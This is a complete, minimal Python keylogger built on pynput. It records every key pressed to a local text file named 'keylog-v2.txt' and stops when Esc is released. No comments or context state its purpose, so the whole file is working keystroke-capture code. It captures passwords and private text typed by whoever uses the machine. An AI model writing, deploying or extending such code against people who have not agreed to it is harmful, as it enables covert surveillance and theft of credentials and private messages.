import pynput
import logging
from pynput.keyboard import Listener,Key

logging.basicConfig(filename="keylog-v2.txt",encoding='utf-8',level=logging.DEBUG)

def pressed(Key):
    logging.info(str(Key))


def released(Key):
    if Key==pynput.keyboard.Key.esc:
        return False

with Listener(on_press=pressed,on_release=released) as listen:
    listen.join()



